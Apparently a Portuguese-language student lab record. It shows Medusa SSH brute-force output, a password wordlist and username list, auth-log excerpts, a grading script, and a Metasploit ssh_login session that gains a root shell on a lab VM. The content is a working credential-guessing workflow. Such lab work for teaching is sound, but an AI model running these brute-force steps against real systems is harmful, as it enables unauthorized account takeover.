ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.136.130 User: alemao Password: schalke04 [SUCCESS]
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: frances (8 of 12, 7 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: espanhol (9 of 12, 8 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: italiano (10 of 12, 9 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: brasileiro (11 of 12, 10 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: russo (12 of 12, 11 complete) Password: r00t (21 of 21 complete)
GENERAL: Medusa has finished.

Registro 

#!/bin/bash
# Registro: programa que registra o aluno
# Anderson - Fev/2022
 
# Parte 1 - registro do nome do aluno
# cria um nome com ate 8 sobrenomes
NOME="$1 $2 $3 $4 $5 $6 $7 $8 $9"
# cria um nome separado por sobrescritos 
if ! [ "$1" = "" ]; then
	NOME2="$1"
fi;
if ! [ "$2" = "" ]; then
	NOME2="$1_$2"	
fi;
if ! [ "$3" = "" ]; then
	NOME2="$1_$2_$3"
fi;	
if ! [ "$4" = "" ]; then
	NOME2="$1_$2_$3_$4"
fi;
if ! [ "$5" = "" ]; then
	NOME2="$1_$2_$3_$4_$5"	
fi;
if ! [ "$6" = "" ]; then
	NOME2="$1_$2_$3_$3_$4_$5_$6"
fi;	
if ! [ "$7" = "" ]; then
	NOME2="$1_$2_$3_$3_$4_$5_$6_$7"
fi;	
if ! [ "$8" = "" ]; then
	NOME2="$1_$2_$3_$3_$4_$5_$6_$7_$8"
fi;
if ! [ "$9" = "" ]; then
	NOME2="$1_$2_$3_$3_$4_$5_$6_$7_$8_$9"
fi;
# o nome do arquivo com os resultados do aula pratica correpsonde a variavel $NOME2
ARQUIVO="PI_$NOME2"
# repassa o conteudo de $NOME (nome do aluno) no $ARQUIVO
echo $NOME > $ARQUIVO
# gera hash do conteúdo de $ARQUIVO, corta o inicio e joga os dados no proprio $ARQUIVO
openssl dgst -sha512 $ARQUIVO > teste.txt
sed 's/SHA512('$ARQUIVO')= //' teste.txt >> $ARQUIVO
echo ============================== >> $ARQUIVO

echo Parte 2 - arquivo /pi/xhydra.txt >> $ARQUIVO
cat /pi/xhydra.txt >> $ARQUIVO
echo ============================== >> $ARQUIVO

Segure

/var/log/secure-20260517:May 16 07:21:14 centos sshd[4035]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4086]: Failed password for root from 192.168.136.128 port 52070 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4086]: Connection closed by 192.168.136.128 port 52070 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: Failed password for russo from 192.168.136.128 port 52030 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: Connection closed by 192.168.136.128 port 52030 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: Failed password for russo from 192.168.136.128 port 52034 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: Connection closed by 192.168.136.128 port 52034 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 17 10:11:29 centos sshd[4489]: Did not receive identification string from 192.168.136.128 port 52082
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3781]: Failed password for alemao from 192.168.136.128 port 51780 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3802]: Failed password for alemao from 192.168.136.128 port 51798 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3804]: Failed password for alemao from 192.168.136.128 port 51806 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3766]: Failed password for alemao from 192.168.136.128 port 51768 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3766]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=alemao
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3768]: Failed password for alemao from 192.168.136.128 port 51770 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3768]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=alemao
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3809]: Failed password for alemao from 192.168.136.128 port 51810 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3784]: Failed password for alemao from 192.168.136.128 port 51782 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3811]: Failed password for alemao from 192.168.136.128 port 51812 ssh2

Senhas

123456
123456789
12345678
hallo123
hallo
12345
passwort
lol123
1234
123
qwertz
ficken
1234567
arschloch
1234567890
1q2w3e4r
killer
sommer
schalke04
dennis
r00t

Usuários 

root
fulano
beltrano
cicrano
admin
americano
alemao
frances
espanhol
italiano
brasileiro
russo

Teste

azureuser@Kali:~$ msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v4.16.48-dev                         ]
+ -- --=[ 1749 exploits - 1002 auxiliary - 302 post       ]
+ -- --=[ 536 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.136.130
RHOSTS => 192.168.136.130
msf auxiliary(scanner/ssh/ssh_login) > set USERNAME root
USERNAME => root
msf auxiliary(scanner/ssh/ssh_login) > set PASSWORD schalke04
PASSWORD => schalke04
msf auxiliary(scanner/ssh/ssh_login) > run

[+] 192.168.136.130:22 - Success: 'root:schalke04' 'uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux centos 3.10.0-862.6.3.el7.x86_64 #1 SMP Tue Jun 26 16:32:21 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.168.136.128:36607 -> 192.168.136.130:22) at 2026-05-18 01:43:26 -0300
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type          Information                              Connection
  --  ----  ----          -----------                              ----------
  1         shell /linux  SSH root:schalke04 (192.168.136.130:22)  192.168.136.128:36607 -> 192.168.136.130:22 (192.168.136.130)

msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...

whoami
root
grep 192.168.136.128 /var/log/scure* | tail > /pi/secure.reserva             
grep: /var/log/scure*: No such file or directory
grep 192.168.136.128 /var/log/secure* | tail > /pi/secure.reserva
grep alemao /var/log/secure* | tail >> /pi/secure.reserva
cat /pi/secure.reserva
/var/log/secure-20260517:May 16 07:21:14 centos sshd[4035]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4086]: Failed password for root from 192.168.136.128 port 52070 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4086]: Connection closed by 192.168.136.128 port 52070 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: Failed password for russo from 192.168.136.128 port 52030 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: Connection closed by 192.168.136.128 port 52030 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: Failed password for russo from 192.168.136.128 port 52034 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: Connection closed by 192.168.136.128 port 52034 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 17 10:11:29 centos sshd[4489]: Did not receive identification string from 192.168.136.128 port 52082
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3781]: Failed password for alemao from 192.168.136.128 port 51780 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3802]: Failed password for alemao from 192.168.136.128 port 51798 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3804]: Failed password for alemao from 192.168.136.128 port 51806 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3766]: Failed password for alemao from 192.168.136.128 port 51768 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3766]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=alemao
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3768]: Failed password for alemao from 192.168.136.128 port 51770 ssh2
